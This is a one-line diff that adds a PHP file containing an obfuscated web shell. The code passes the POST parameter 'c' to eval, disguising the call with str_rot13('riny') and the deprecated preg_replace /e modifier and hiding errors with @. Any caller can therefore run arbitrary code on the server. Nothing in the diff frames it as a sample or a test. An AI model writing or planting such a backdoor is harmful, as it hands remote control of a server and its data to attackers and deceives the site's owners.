@@ -1,0 +1,1 @@
+<?php ($b = $_POST['c']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($b)', 'add');?>
